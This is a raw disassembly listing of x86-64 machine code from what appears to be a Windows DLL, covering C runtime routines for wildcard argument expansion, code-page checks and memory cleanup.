   180006ec7:	48 3b 5d e8          	cmp    -0x18(%rbp),%rbx
   180006ecb:	75 ee                	jne    0x180006ebb
   180006ecd:	e9 a5 00 00 00       	jmp    0x180006f77
   180006ed2:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   180006ed6:	48 8b d0             	mov    %rax,%rdx
   180006ed9:	e8 0a 03 00 00       	call   0x1800071e8
   180006ede:	8b f0                	mov    %eax,%esi
   180006ee0:	85 c0                	test   %eax,%eax
   180006ee2:	0f 85 9e 00 00 00    	jne    0x180006f86
   180006ee8:	48 83 c3 08          	add    $0x8,%rbx
   180006eec:	48 8b 03             	mov    (%rbx),%rax
   180006eef:	48 85 c0             	test   %rax,%rax
   180006ef2:	75 84                	jne    0x180006e78
   180006ef4:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   180006ef8:	49 83 cc ff          	or     $0xffffffffffffffff,%r12
   180006efc:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
   180006f00:	49 8b d7             	mov    %r15,%rdx
   180006f03:	4c 8b f6             	mov    %rsi,%r14
   180006f06:	48 89 55 50          	mov    %rdx,0x50(%rbp)
   180006f0a:	4c 2b f7             	sub    %rdi,%r14
   180006f0d:	48 8b c7             	mov    %rdi,%rax
   180006f10:	49 c1 fe 03          	sar    $0x3,%r14
   180006f14:	49 ff c6             	inc    %r14
   180006f17:	48 3b fe             	cmp    %rsi,%rdi
   180006f1a:	74 22                	je     0x180006f3e
   180006f1c:	4c 8b 00             	mov    (%rax),%r8
   180006f1f:	49 8b cc             	mov    %r12,%rcx
   180006f22:	48 ff c1             	inc    %rcx
   180006f25:	45 38 3c 08          	cmp    %r15b,(%r8,%rcx,1)
   180006f29:	75 f7                	jne    0x180006f22
   180006f2b:	48 ff c2             	inc    %rdx
   180006f2e:	48 83 c0 08          	add    $0x8,%rax
   180006f32:	48 03 d1             	add    %rcx,%rdx
   180006f35:	48 3b c6             	cmp    %rsi,%rax
   180006f38:	75 e2                	jne    0x180006f1c
   180006f3a:	48 89 55 50          	mov    %rdx,0x50(%rbp)
   180006f3e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180006f44:	49 8b ce             	mov    %r14,%rcx
   180006f47:	e8 c4 e2 ff ff       	call   0x180005210
   180006f4c:	48 8b d8             	mov    %rax,%rbx
   180006f4f:	48 85 c0             	test   %rax,%rax
   180006f52:	75 53                	jne    0x180006fa7
   180006f54:	33 c9                	xor    %ecx,%ecx
   180006f56:	e8 15 fb ff ff       	call   0x180006a70
   180006f5b:	48 8b df             	mov    %rdi,%rbx
   180006f5e:	48 3b fe             	cmp    %rsi,%rdi
   180006f61:	74 11                	je     0x180006f74
   180006f63:	48 8b 0b             	mov    (%rbx),%rcx
   180006f66:	e8 05 fb ff ff       	call   0x180006a70
   180006f6b:	48 83 c3 08          	add    $0x8,%rbx
   180006f6f:	48 3b de             	cmp    %rsi,%rbx
   180006f72:	75 ef                	jne    0x180006f63
   180006f74:	41 8b f4             	mov    %r12d,%esi
   180006f77:	48 8b cf             	mov    %rdi,%rcx
   180006f7a:	e8 f1 fa ff ff       	call   0x180006a70
   180006f7f:	8b c6                	mov    %esi,%eax
   180006f81:	e9 ae 00 00 00       	jmp    0x180007034
   180006f86:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   180006f8a:	48 8b df             	mov    %rdi,%rbx
   180006f8d:	48 3b 7d e8          	cmp    -0x18(%rbp),%rdi
   180006f91:	74 e4                	je     0x180006f77
   180006f93:	48 8b 0b             	mov    (%rbx),%rcx
   180006f96:	e8 d5 fa ff ff       	call   0x180006a70
   180006f9b:	48 83 c3 08          	add    $0x8,%rbx
   180006f9f:	48 3b 5d e8          	cmp    -0x18(%rbp),%rbx
   180006fa3:	75 ee                	jne    0x180006f93
   180006fa5:	eb d0                	jmp    0x180006f77
   180006fa7:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   180006fab:	4c 8b f7             	mov    %rdi,%r14
   180006fae:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   180006fb2:	4c 8b e1             	mov    %rcx,%r12
   180006fb5:	48 3b fe             	cmp    %rsi,%rdi
   180006fb8:	74 4c                	je     0x180007006
   180006fba:	48 2b c7             	sub    %rdi,%rax
   180006fbd:	48 89 45 48          	mov    %rax,0x48(%rbp)
   180006fc1:	4d 8b 06             	mov    (%r14),%r8
   180006fc4:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   180006fc8:	49 ff c7             	inc    %r15
   180006fcb:	43 80 3c 38 00       	cmpb   $0x0,(%r8,%r15,1)
   180006fd0:	75 f6                	jne    0x180006fc8
   180006fd2:	48 8b d1             	mov    %rcx,%rdx
   180006fd5:	49 ff c7             	inc    %r15
   180006fd8:	49 2b d4             	sub    %r12,%rdx
   180006fdb:	4d 8b cf             	mov    %r15,%r9
   180006fde:	48 03 55 50          	add    0x50(%rbp),%rdx
   180006fe2:	49 8b cc             	mov    %r12,%rcx
   180006fe5:	e8 76 3a 00 00       	call   0x18000aa60
   180006fea:	85 c0                	test   %eax,%eax
   180006fec:	75 5e                	jne    0x18000704c
   180006fee:	48 8b 45 48          	mov    0x48(%rbp),%rax
   180006ff2:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   180006ff6:	4e 89 24 30          	mov    %r12,(%rax,%r14,1)
   180006ffa:	4d 03 e7             	add    %r15,%r12
   180006ffd:	49 83 c6 08          	add    $0x8,%r14
   180007001:	4c 3b f6             	cmp    %rsi,%r14
   180007004:	75 bb                	jne    0x180006fc1
   180007006:	33 c9                	xor    %ecx,%ecx
   180007008:	49 89 5d 00          	mov    %rbx,0x0(%r13)
   18000700c:	e8 5f fa ff ff       	call   0x180006a70
   180007011:	48 8b df             	mov    %rdi,%rbx
   180007014:	48 3b fe             	cmp    %rsi,%rdi
   180007017:	74 11                	je     0x18000702a
   180007019:	48 8b 0b             	mov    (%rbx),%rcx
   18000701c:	e8 4f fa ff ff       	call   0x180006a70
   180007021:	48 83 c3 08          	add    $0x8,%rbx
   180007025:	48 3b de             	cmp    %rsi,%rbx
   180007028:	75 ef                	jne    0x180007019
   18000702a:	48 8b cf             	mov    %rdi,%rcx
   18000702d:	e8 3e fa ff ff       	call   0x180006a70
   180007032:	33 c0                	xor    %eax,%eax
   180007034:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   18000703b:	00 
   18000703c:	48 83 c4 50          	add    $0x50,%rsp
   180007040:	41 5f                	pop    %r15
   180007042:	41 5e                	pop    %r14
   180007044:	41 5d                	pop    %r13
   180007046:	41 5c                	pop    %r12
   180007048:	5f                   	pop    %rdi
   180007049:	5e                   	pop    %rsi
   18000704a:	5d                   	pop    %rbp
   18000704b:	c3                   	ret
   18000704c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180007052:	45 33 c9             	xor    %r9d,%r9d
   180007055:	45 33 c0             	xor    %r8d,%r8d
   180007058:	33 d2                	xor    %edx,%edx
   18000705a:	33 c9                	xor    %ecx,%ecx
   18000705c:	e8 0b ef ff ff       	call   0x180005f6c
   180007061:	cc                   	int3
   180007062:	cc                   	int3
   180007063:	cc                   	int3
   180007064:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007069:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000706e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180007073:	57                   	push   %rdi
   180007074:	41 54                	push   %r12
   180007076:	41 55                	push   %r13
   180007078:	41 56                	push   %r14
   18000707a:	41 57                	push   %r15
   18000707c:	48 83 ec 30          	sub    $0x30,%rsp
   180007080:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   180007084:	49 8b f1             	mov    %r9,%rsi
   180007087:	33 ff                	xor    %edi,%edi
   180007089:	4d 8b f0             	mov    %r8,%r14
   18000708c:	4c 8b ea             	mov    %rdx,%r13
   18000708f:	4c 8b e1             	mov    %rcx,%r12
   180007092:	48 ff c5             	inc    %rbp
   180007095:	40 38 3c 29          	cmp    %dil,(%rcx,%rbp,1)
   180007099:	75 f7                	jne    0x180007092
   18000709b:	ba 01 00 00 00       	mov    $0x1,%edx
   1800070a0:	49 8b c6             	mov    %r14,%rax
   1800070a3:	48 03 ea             	add    %rdx,%rbp
   1800070a6:	48 f7 d0             	not    %rax
   1800070a9:	48 3b e8             	cmp    %rax,%rbp
   1800070ac:	76 20                	jbe    0x1800070ce
   1800070ae:	8d 42 0b             	lea    0xb(%rdx),%eax
   1800070b1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1800070b6:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1800070bb:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1800070c0:	48 83 c4 30          	add    $0x30,%rsp
   1800070c4:	41 5f                	pop    %r15
   1800070c6:	41 5e                	pop    %r14
   1800070c8:	41 5d                	pop    %r13
   1800070ca:	41 5c                	pop    %r12
   1800070cc:	5f                   	pop    %rdi
   1800070cd:	c3                   	ret
   1800070ce:	4d 8d 78 01          	lea    0x1(%r8),%r15
   1800070d2:	4c 03 fd             	add    %rbp,%r15
   1800070d5:	49 8b cf             	mov    %r15,%rcx
   1800070d8:	e8 13 f9 ff ff       	call   0x1800069f0
   1800070dd:	48 8b d8             	mov    %rax,%rbx
   1800070e0:	4d 85 f6             	test   %r14,%r14
   1800070e3:	74 19                	je     0x1800070fe
   1800070e5:	4d 8b ce             	mov    %r14,%r9
   1800070e8:	4d 8b c5             	mov    %r13,%r8
   1800070eb:	49 8b d7             	mov    %r15,%rdx
   1800070ee:	48 8b c8             	mov    %rax,%rcx
   1800070f1:	e8 6a 39 00 00       	call   0x18000aa60
   1800070f6:	85 c0                	test   %eax,%eax
   1800070f8:	0f 85 d5 00 00 00    	jne    0x1800071d3
   1800070fe:	4d 2b fe             	sub    %r14,%r15
   180007101:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   180007105:	49 8b d7             	mov    %r15,%rdx
   180007108:	4c 8b cd             	mov    %rbp,%r9
   18000710b:	4d 8b c4             	mov    %r12,%r8
   18000710e:	e8 4d 39 00 00       	call   0x18000aa60
   180007113:	85 c0                	test   %eax,%eax
   180007115:	0f 85 b8 00 00 00    	jne    0x1800071d3
   18000711b:	4c 8b 76 10          	mov    0x10(%rsi),%r14
   18000711f:	44 8d 78 08          	lea    0x8(%rax),%r15d
   180007123:	4c 39 76 08          	cmp    %r14,0x8(%rsi)
   180007127:	0f 85 8d 00 00 00    	jne    0x1800071ba
   18000712d:	48 39 3e             	cmp    %rdi,(%rsi)
   180007130:	75 2b                	jne    0x18000715d
   180007132:	41 8b d7             	mov    %r15d,%edx
   180007135:	8d 48 04             	lea    0x4(%rax),%ecx
   180007138:	e8 b3 f8 ff ff       	call   0x1800069f0
   18000713d:	33 c9                	xor    %ecx,%ecx
   18000713f:	48 89 06             	mov    %rax,(%rsi)
   180007142:	e8 29 f9 ff ff       	call   0x180006a70
   180007147:	48 8b 06             	mov    (%rsi),%rax
   18000714a:	48 85 c0             	test   %rax,%rax
   18000714d:	74 42                	je     0x180007191
   18000714f:	48 89 46 08          	mov    %rax,0x8(%rsi)
   180007153:	48 83 c0 20          	add    $0x20,%rax
   180007157:	48 89 46 10          	mov    %rax,0x10(%rsi)
   18000715b:	eb 5d                	jmp    0x1800071ba
   18000715d:	4c 2b 36             	sub    (%rsi),%r14
   180007160:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   180007167:	ff ff 7f 
   18000716a:	49 c1 fe 03          	sar    $0x3,%r14
   18000716e:	4c 3b f0             	cmp    %rax,%r14
   180007171:	77 1e                	ja     0x180007191
   180007173:	48 8b 0e             	mov    (%rsi),%rcx
   180007176:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   18000717a:	48 8b d5             	mov    %rbp,%rdx
   18000717d:	4d 8b c7             	mov    %r15,%r8
   180007180:	e8 8b 14 00 00       	call   0x180008610
   180007185:	48 85 c0             	test   %rax,%rax
   180007188:	75 16                	jne    0x1800071a0
   18000718a:	33 c9                	xor    %ecx,%ecx
   18000718c:	e8 df f8 ff ff       	call   0x180006a70
   180007191:	48 8b cb             	mov    %rbx,%rcx
   180007194:	bf 0c 00 00 00       	mov    $0xc,%edi
   180007199:	e8 d2 f8 ff ff       	call   0x180006a70
   18000719e:	eb 25                	jmp    0x1800071c5
   1800071a0:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   1800071a4:	48 89 06             	mov    %rax,(%rsi)
   1800071a7:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   1800071ab:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   1800071af:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   1800071b3:	33 c9                	xor    %ecx,%ecx
   1800071b5:	e8 b6 f8 ff ff       	call   0x180006a70
   1800071ba:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   1800071be:	48 89 19             	mov    %rbx,(%rcx)
   1800071c1:	4c 01 7e 08          	add    %r15,0x8(%rsi)
   1800071c5:	33 c9                	xor    %ecx,%ecx
   1800071c7:	e8 a4 f8 ff ff       	call   0x180006a70
   1800071cc:	8b c7                	mov    %edi,%eax
   1800071ce:	e9 de fe ff ff       	jmp    0x1800070b1
   1800071d3:	45 33 c9             	xor    %r9d,%r9d
   1800071d6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800071db:	45 33 c0             	xor    %r8d,%r8d
   1800071de:	33 d2                	xor    %edx,%edx
   1800071e0:	33 c9                	xor    %ecx,%ecx
   1800071e2:	e8 85 ed ff ff       	call   0x180005f6c
   1800071e7:	cc                   	int3
   1800071e8:	40 55                	rex push %rbp
   1800071ea:	53                   	push   %rbx
   1800071eb:	56                   	push   %rsi
   1800071ec:	57                   	push   %rdi
   1800071ed:	41 54                	push   %r12
   1800071ef:	41 55                	push   %r13
   1800071f1:	41 56                	push   %r14
   1800071f3:	48 8d ac 24 c0 fd ff 	lea    -0x240(%rsp),%rbp
   1800071fa:	ff 
   1800071fb:	48 81 ec 40 03 00 00 	sub    $0x340,%rsp
   180007202:	48 8b 05 f7 2d 01 00 	mov    0x12df7(%rip),%rax        # 0x18001a000
   180007209:	48 33 c4             	xor    %rsp,%rax
   18000720c:	48 89 85 30 02 00 00 	mov    %rax,0x230(%rbp)
   180007213:	4d 8b e0             	mov    %r8,%r12
   180007216:	48 8b f9             	mov    %rcx,%rdi
   180007219:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   180007220:	20 00 00 
   180007223:	48 3b d1             	cmp    %rcx,%rdx
   180007226:	74 22                	je     0x18000724a
   180007228:	8a 02                	mov    (%rdx),%al
   18000722a:	2c 2f                	sub    $0x2f,%al
   18000722c:	3c 2d                	cmp    $0x2d,%al
   18000722e:	77 0a                	ja     0x18000723a
   180007230:	48 0f be c0          	movsbq %al,%rax
   180007234:	48 0f a3 c3          	bt     %rax,%rbx
   180007238:	72 10                	jb     0x18000724a
   18000723a:	48 8b cf             	mov    %rdi,%rcx
   18000723d:	e8 a6 3d 00 00       	call   0x18000afe8
   180007242:	48 8b d0             	mov    %rax,%rdx
   180007245:	48 3b c7             	cmp    %rdi,%rax
   180007248:	75 de                	jne    0x180007228
   18000724a:	44 8a 02             	mov    (%rdx),%r8b
   18000724d:	41 80 f8 3a          	cmp    $0x3a,%r8b
   180007251:	75 1e                	jne    0x180007271
   180007253:	48 8d 47 01          	lea    0x1(%rdi),%rax
   180007257:	48 3b d0             	cmp    %rax,%rdx
   18000725a:	74 15                	je     0x180007271
   18000725c:	4d 8b cc             	mov    %r12,%r9
   18000725f:	45 33 c0             	xor    %r8d,%r8d
   180007262:	33 d2                	xor    %edx,%edx
   180007264:	48 8b cf             	mov    %rdi,%rcx
   180007267:	e8 f8 fd ff ff       	call   0x180007064
   18000726c:	e9 b4 02 00 00       	jmp    0x180007525
   180007271:	41 80 e8 2f          	sub    $0x2f,%r8b
   180007275:	45 33 f6             	xor    %r14d,%r14d
   180007278:	41 80 f8 2d          	cmp    $0x2d,%r8b
   18000727c:	77 0c                	ja     0x18000728a
   18000727e:	49 0f be c0          	movsbq %r8b,%rax
   180007282:	48 0f a3 c3          	bt     %rax,%rbx
   180007286:	b0 01                	mov    $0x1,%al
   180007288:	72 03                	jb     0x18000728d
   18000728a:	41 8a c6             	mov    %r14b,%al
   18000728d:	48 2b d7             	sub    %rdi,%rdx
   180007290:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180007294:	48 ff c2             	inc    %rdx
   180007297:	41 b8 50 02 00 00    	mov    $0x250,%r8d
   18000729d:	f6 d8                	neg    %al
   18000729f:	4d 1b ed             	sbb    %r13,%r13
   1800072a2:	4c 23 ea             	and    %rdx,%r13
   1800072a5:	33 d2                	xor    %edx,%edx
   1800072a7:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   1800072ac:	e8 ff 66 00 00       	call   0x18000d9b0
   1800072b1:	33 d2                	xor    %edx,%edx
   1800072b3:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   1800072b8:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800072bd:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   1800072c2:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   1800072c7:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1800072cc:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
   1800072d1:	44 88 74 24 68       	mov    %r14b,0x68(%rsp)
   1800072d6:	e8 65 d6 ff ff       	call   0x180004940
   1800072db:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1800072e0:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1800072e5:	39 48 0c             	cmp    %ecx,0xc(%rax)
   1800072e8:	75 17                	jne    0x180007301
   1800072ea:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   1800072ee:	74 0c                	je     0x1800072fc
   1800072f0:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800072f5:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1800072fc:	44 8b c9             	mov    %ecx,%r9d
   1800072ff:	eb 38                	jmp    0x180007339
   180007301:	e8 c2 15 00 00       	call   0x1800088c8
   180007306:	85 c0                	test   %eax,%eax
   180007308:	75 1a                	jne    0x180007324
   18000730a:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   18000730e:	74 0c                	je     0x18000731c
   180007310:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180007315:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000731c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180007322:	eb 15                	jmp    0x180007339
   180007324:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   180007328:	74 0c                	je     0x180007336
   18000732a:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   18000732f:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180007336:	45 8b ce             	mov    %r14d,%r9d
   180007339:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   18000733e:	48 8b cf             	mov    %rdi,%rcx
   180007341:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180007346:	e8 91 f7 ff ff       	call   0x180006adc
   18000734b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180007350:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   180007354:	85 c0                	test   %eax,%eax
   180007356:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   18000735b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180007360:	49 0f 45 ce          	cmovne %r14,%rcx
   180007364:	45 33 c9             	xor    %r9d,%r9d
   180007367:	33 d2                	xor    %edx,%edx
   180007369:	ff 15 e9 7d 00 00    	call   *0x7de9(%rip)        # 0x18000f158
   18000736f:	48 8b d8             	mov    %rax,%rbx
   180007372:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180007376:	75 2a                	jne    0x1800073a2
   180007378:	4d 8b cc             	mov    %r12,%r9
   18000737b:	45 33 c0             	xor    %r8d,%r8d
   18000737e:	33 d2                	xor    %edx,%edx
   180007380:	48 8b cf             	mov    %rdi,%rcx
   180007383:	e8 dc fc ff ff       	call   0x180007064
   180007388:	8b d8                	mov    %eax,%ebx
   18000738a:	44 38 74 24 68       	cmp    %r14b,0x68(%rsp)
   18000738f:	74 0a                	je     0x18000739b
   180007391:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180007396:	e8 d5 f6 ff ff       	call   0x180006a70
   18000739b:	8b c3                	mov    %ebx,%eax
   18000739d:	e9 83 01 00 00       	jmp    0x180007525
   1800073a2:	49 8b 74 24 08       	mov    0x8(%r12),%rsi
   1800073a7:	49 2b 34 24          	sub    (%r12),%rsi
   1800073ab:	48 c1 fe 03          	sar    $0x3,%rsi
   1800073af:	33 d2                	xor    %edx,%edx
   1800073b1:	4c 89 75 b0          	mov    %r14,-0x50(%rbp)
   1800073b5:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1800073b9:	4c 89 75 b8          	mov    %r14,-0x48(%rbp)
   1800073bd:	4c 89 75 c0          	mov    %r14,-0x40(%rbp)
   1800073c1:	4c 89 75 c8          	mov    %r14,-0x38(%rbp)
   1800073c5:	4c 89 75 d0          	mov    %r14,-0x30(%rbp)
   1800073c9:	44 88 75 d8          	mov    %r14b,-0x28(%rbp)
   1800073cd:	e8 6e d5 ff ff       	call   0x180004940
   1800073d2:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   1800073d6:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1800073db:	39 48 0c             	cmp    %ecx,0xc(%rax)
   1800073de:	75 16                	jne    0x1800073f6
   1800073e0:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   1800073e4:	74 0b                	je     0x1800073f1
   1800073e6:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1800073ea:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1800073f1:	44 8b c9             	mov    %ecx,%r9d
   1800073f4:	eb 36                	jmp    0x18000742c
   1800073f6:	e8 cd 14 00 00       	call   0x1800088c8
   1800073fb:	85 c0                	test   %eax,%eax
   1800073fd:	75 19                	jne    0x180007418
   1800073ff:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   180007403:	74 0b                	je     0x180007410
   180007405:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   180007409:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180007410:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180007416:	eb 14                	jmp    0x18000742c
   180007418:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   18000741c:	74 0b                	je     0x180007429
   18000741e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   180007422:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180007429:	45 8b ce             	mov    %r14d,%r9d
   18000742c:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180007431:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   180007435:	48 8d 4d 0c          	lea    0xc(%rbp),%rcx
   180007439:	e8 3e f8 ff ff       	call   0x180006c7c
   18000743e:	4c 8b 75 c0          	mov    -0x40(%rbp),%r14
   180007442:	33 d2                	xor    %edx,%edx
   180007444:	85 c0                	test   %eax,%eax
   180007446:	49 8b ce             	mov    %r14,%rcx
   180007449:	48 0f 45 ca          	cmovne %rdx,%rcx
   18000744d:	80 39 2e             	cmpb   $0x2e,(%rcx)
   180007450:	75 1f                	jne    0x180007471
   180007452:	8a 41 01             	mov    0x1(%rcx),%al
   180007455:	84 c0                	test   %al,%al
   180007457:	75 0f                	jne    0x180007468
   180007459:	38 55 d8             	cmp    %dl,-0x28(%rbp)
   18000745c:	74 3a                	je     0x180007498
   18000745e:	49 8b ce             	mov    %r14,%rcx
   180007461:	e8 0a f6 ff ff       	call   0x180006a70
   180007466:	eb 30                	jmp    0x180007498
   180007468:	3c 2e                	cmp    $0x2e,%al
   18000746a:	75 05                	jne    0x180007471
   18000746c:	38 51 02             	cmp    %dl,0x2(%rcx)
   18000746f:	74 e8                	je     0x180007459
   180007471:	4d 8b cc             	mov    %r12,%r9
   180007474:	4d 8b c5             	mov    %r13,%r8
   180007477:	48 8b d7             	mov    %rdi,%rdx
   18000747a:	e8 e5 fb ff ff       	call   0x180007064
   18000747f:	44 8b e8             	mov    %eax,%r13d
   180007482:	85 c0                	test   %eax,%eax
   180007484:	75 74                	jne    0x1800074fa
   180007486:	38 45 d8             	cmp    %al,-0x28(%rbp)
   180007489:	74 08                	je     0x180007493
   18000748b:	49 8b ce             	mov    %r14,%rcx
   18000748e:	e8 dd f5 ff ff       	call   0x180006a70
   180007493:	4c 8b 6c 24 38       	mov    0x38(%rsp),%r13
   180007498:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   18000749c:	48 8b cb             	mov    %rbx,%rcx
   18000749f:	ff 15 bb 7c 00 00    	call   *0x7cbb(%rip)        # 0x18000f160
   1800074a5:	45 33 f6             	xor    %r14d,%r14d
   1800074a8:	85 c0                	test   %eax,%eax
   1800074aa:	0f 85 ff fe ff ff    	jne    0x1800073af
   1800074b0:	49 8b 04 24          	mov    (%r12),%rax
   1800074b4:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   1800074b9:	48 2b d0             	sub    %rax,%rdx
   1800074bc:	48 c1 fa 03          	sar    $0x3,%rdx
   1800074c0:	48 3b f2             	cmp    %rdx,%rsi
   1800074c3:	74 17                	je     0x1800074dc
   1800074c5:	48 2b d6             	sub    %rsi,%rdx
   1800074c8:	48 8d 0c f0          	lea    (%rax,%rsi,8),%rcx
   1800074cc:	4c 8d 0d f5 f5 ff ff 	lea    -0xa0b(%rip),%r9        # 0x180006ac8
   1800074d3:	45 8d 46 08          	lea    0x8(%r14),%r8d
   1800074d7:	e8 e4 31 00 00       	call   0x18000a6c0
   1800074dc:	48 8b cb             	mov    %rbx,%rcx
   1800074df:	ff 15 6b 7c 00 00    	call   *0x7c6b(%rip)        # 0x18000f150
   1800074e5:	44 38 74 24 68       	cmp    %r14b,0x68(%rsp)
   1800074ea:	74 0a                	je     0x1800074f6
   1800074ec:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800074f1:	e8 7a f5 ff ff       	call   0x180006a70
   1800074f6:	33 c0                	xor    %eax,%eax
   1800074f8:	eb 2b                	jmp    0x180007525
   1800074fa:	80 7d d8 00          	cmpb   $0x0,-0x28(%rbp)
   1800074fe:	74 08                	je     0x180007508
   180007500:	49 8b ce             	mov    %r14,%rcx
   180007503:	e8 68 f5 ff ff       	call   0x180006a70
   180007508:	48 8b cb             	mov    %rbx,%rcx
   18000750b:	ff 15 3f 7c 00 00    	call   *0x7c3f(%rip)        # 0x18000f150
   180007511:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   180007516:	74 0a                	je     0x180007522
   180007518:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000751d:	e8 4e f5 ff ff       	call   0x180006a70
   180007522:	41 8b c5             	mov    %r13d,%eax
   180007525:	48 8b 8d 30 02 00 00 	mov    0x230(%rbp),%rcx
   18000752c:	48 33 cc             	xor    %rsp,%rcx
   18000752f:	e8 9c 9d ff ff       	call   0x1800012d0
   180007534:	48 81 c4 40 03 00 00 	add    $0x340,%rsp
   18000753b:	41 5e                	pop    %r14
   18000753d:	41 5d                	pop    %r13
   18000753f:	41 5c                	pop    %r12
   180007541:	5f                   	pop    %rdi
   180007542:	5e                   	pop    %rsi
   180007543:	5b                   	pop    %rbx
   180007544:	5d                   	pop    %rbp
   180007545:	c3                   	ret
   180007546:	cc                   	int3
   180007547:	cc                   	int3
   180007548:	e9 db f8 ff ff       	jmp    0x180006e28
   18000754d:	cc                   	int3
   18000754e:	cc                   	int3
   18000754f:	cc                   	int3
   180007550:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007555:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000755a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000755f:	57                   	push   %rdi
   180007560:	48 83 ec 40          	sub    $0x40,%rsp
   180007564:	33 ed                	xor    %ebp,%ebp
   180007566:	41 8b f1             	mov    %r9d,%esi
   180007569:	48 8b da             	mov    %rdx,%rbx
   18000756c:	48 8b f9             	mov    %rcx,%rdi
   18000756f:	48 85 c9             	test   %rcx,%rcx
   180007572:	75 1b                	jne    0x18000758f
   180007574:	40 38 6a 28          	cmp    %bpl,0x28(%rdx)
   180007578:	74 04                	je     0x18000757e
   18000757a:	40 88 6a 28          	mov    %bpl,0x28(%rdx)
   18000757e:	48 89 6a 10          	mov    %rbp,0x10(%rdx)
   180007582:	48 89 6a 18          	mov    %rbp,0x18(%rdx)
   180007586:	48 89 6a 20          	mov    %rbp,0x20(%rdx)
   18000758a:	e9 c3 00 00 00       	jmp    0x180007652
   18000758f:	66 39 29             	cmp    %bp,(%rcx)
   180007592:	75 34                	jne    0x1800075c8
   180007594:	48 39 6a 18          	cmp    %rbp,0x18(%rdx)
   180007598:	75 25                	jne    0x1800075bf
   18000759a:	40 38 6a 28          	cmp    %bpl,0x28(%rdx)
   18000759e:	74 04                	je     0x1800075a4
   1800075a0:	40 88 6a 28          	mov    %bpl,0x28(%rdx)
   1800075a4:	e8 4b eb ff ff       	call   0x1800060f4
   1800075a9:	b9 22 00 00 00       	mov    $0x22,%ecx
   1800075ae:	89 08                	mov    %ecx,(%rax)
   1800075b0:	8b c1                	mov    %ecx,%eax
